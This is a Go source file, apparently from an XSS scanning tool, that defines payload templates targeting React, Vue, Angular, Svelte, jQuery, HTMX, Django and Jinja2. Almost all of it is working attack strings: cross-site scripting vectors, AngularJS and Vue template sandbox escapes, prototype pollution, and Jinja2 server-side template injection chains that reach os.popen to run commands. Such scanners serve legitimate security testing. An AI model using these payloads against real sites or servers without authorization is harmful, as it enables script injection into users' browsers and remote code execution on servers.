package payload

import (
	"strings"

	"github.com/xsscan/xsscan/pkg/context"
	"github.com/xsscan/xsscan/pkg/model"
)

// FrameworkPayloads returns payloads specific to a detected framework.
// These target known XSS vectors in popular JavaScript frameworks.
func FrameworkPayloads(framework string) []PayloadTemplate {
	switch strings.ToLower(framework) {
	case "react":
		return reactPayloads()
	case "vue", "vue.js":
		return vuePayloads()
	case "angular":
		return angularPayloads()
	case "svelte":
		return sveltePayloads()
	case "jquery":
		return jqueryPayloads()
	case "htmx":
		return htmxPayloads()
	case "django":
		return djangoPayloads()
	case "flask", "jinja2":
		return jinjaPayloads()
	default:
		return nil
	}
}

func reactPayloads() []PayloadTemplate {
	return []PayloadTemplate{
		{
			Value:    `{"__html":"<img src=x onerror=alert(1)>"}`,
			Context:  context.ContextJSONValue,
			Severity: model.Critical,
			Desc:     "React: dangerouslySetInnerHTML via JSON injection",
		},
		{
			Value:    `<div dangerouslySetInnerHTML={{__html:"<img src=x onerror=alert(1)>"}}></div>`,
			Context:  context.ContextHTMLBody,
			Severity: model.Critical,
			Desc:     "React: dangerouslySetInnerHTML attribute",
		},
	}
}

func vuePayloads() []PayloadTemplate {
	return []PayloadTemplate{
		{
			Value:    `{{constructor.constructor('alert(1)')()}}`,
			Context:  context.ContextTemplate,
			Severity: model.Critical,
			Desc:     "Vue 2: template sandbox escape via constructor chain",
		},
		{
			Value:    `{{_openBlock.constructor('alert(1)')()}}`,
			Context:  context.ContextTemplate,
			Severity: model.Critical,
			Desc:     "Vue 3: template sandbox escape via _openBlock",
		},
		{
			Value:    `<div v-html="<img src=x onerror=alert(1)>"></div>`,
			Context:  context.ContextHTMLBody,
			Severity: model.High,
			Desc:     "Vue: v-html directive injection",
		},
	}
}

func angularPayloads() []PayloadTemplate {
	return []PayloadTemplate{
		// AngularJS 1.x sandbox escape via toString constructor chain
		{
			Value:    `{{'a]'.constructor.prototype.charAt=[].join;$eval('x]alert(1)')}}`,
			Context:  context.ContextTemplate,
			Severity: model.Critical,
			Desc:     "AngularJS 1.x: sandbox escape via charAt prototype pollution",
		},
		{
			Value:    `{{constructor.constructor('alert(1)')()}}`,
			Context:  context.ContextTemplate,
			Severity: model.High,
			Desc:     "AngularJS: constructor chain escape",
		},
		// AngularJS 1.x — $eval via toString/call prototype chain
		{
			Value:    `{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["alert(1)"].forEach(alert)}}`,
			Context:  context.ContextTemplate,
			Severity: model.Critical,
			Desc:     "AngularJS 1.x: toString/call prototype chain",
		},
		// Angular 2+ template injection via structural directives
		{
			Value:    `<div *ngIf="constructor.constructor('alert(1)')()">XSS</div>`,
			Context:  context.ContextHTMLBody,
			Severity: model.High,
			Desc:     "Angular 2+: template injection via *ngIf",
		},
		{
			Value:    `<ng-template *ngFor="let x of [constructor.constructor('alert(1)')()]"></ng-template>`,
			Context:  context.ContextHTMLBody,
			Severity: model.High,
			Desc:     "Angular 2+: template injection via *ngFor",
		},
		// AngularJS 1.x — charAt join escape (variant without bracket trick)
		{
			Value:    `{{'a'.constructor.prototype.charAt=[].join;$eval('x.alert(1)')}}`,
			Context:  context.ContextTemplate,
			Severity: model.High,
			Desc:     "AngularJS 1.x: charAt join escape (variant)",
		},
		// AngularJS — object literal breakout attempt
		{
			Value:    `{{{}.")));alert(1)//"}}`,
			Context:  context.ContextTemplate,
			Severity: model.Medium,
			Desc:     "AngularJS: object literal breakout attempt",
		},
	}
}

func sveltePayloads() []PayloadTemplate {
	return []PayloadTemplate{
		{
			Value:    `<svelte:window on:keydown={alert(1)} />`,
			Context:  context.ContextHTMLBody,
			Severity: model.High,
			Desc:     "Svelte: window event handler injection",
		},
		{
			Value:    `<img src=x on:error={alert(1)}>`,
			Context:  context.ContextHTMLBody,
			Severity: model.High,
			Desc:     "Svelte: on:error event handler",
		},
	}
}

func jqueryPayloads() []PayloadTemplate {
	return []PayloadTemplate{
		{
			Value:    `<img src=x onerror=$.globalEval('alert(1)')>`,
			Context:  context.ContextHTMLBody,
			Severity: model.High,
			Desc:     "jQuery: globalEval via param pollution",
		},
		{
			Value:    `$.parseJSON('{"__proto__":{"polluted":"<img src=x onerror=alert(1)>"}}')`,
			Context:  context.ContextJSBlock,
			Severity: model.Medium,
			Desc:     "jQuery: prototype pollution via parseJSON",
		},
	}
}

func htmxPayloads() []PayloadTemplate {
	return []PayloadTemplate{
		{
			Value:    `<div hx-on:click="alert(1)" hx-get="/x">click</div>`,
			Context:  context.ContextHTMLBody,
			Severity: model.High,
			Desc:     "HTMX: hx-on event handler injection",
		},
		{
			Value:    `<div hx-trigger="click" hx-get="javascript:alert(1)">load</div>`,
			Context:  context.ContextHTMLBody,
			Severity: model.High,
			Desc:     "HTMX: javascript: protocol in hx-get",
		},
	}
}

func djangoPayloads() []PayloadTemplate {
	return []PayloadTemplate{
		{
			Value:    `{{request.GET.q|safe}}`,
			Context:  context.ContextTemplate,
			Severity: model.High,
			Desc:     "Django: safe filter bypass (if controllable)",
		},
	}
}

func jinjaPayloads() []PayloadTemplate {
	return []PayloadTemplate{
		{
			Value:    `{{config.__class__.__init__.__globals__.os.popen('alert(1)').read()}}`,
			Context:  context.ContextTemplate,
			Severity: model.Critical,
			Desc:     "Jinja2: SSTI to RCE via config class chain",
		},
		{
			Value:    `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`,
			Context:  context.ContextTemplate,
			Severity: model.Critical,
			Desc:     "Jinja2: SSTI via request.application chain",
		},
	}
}
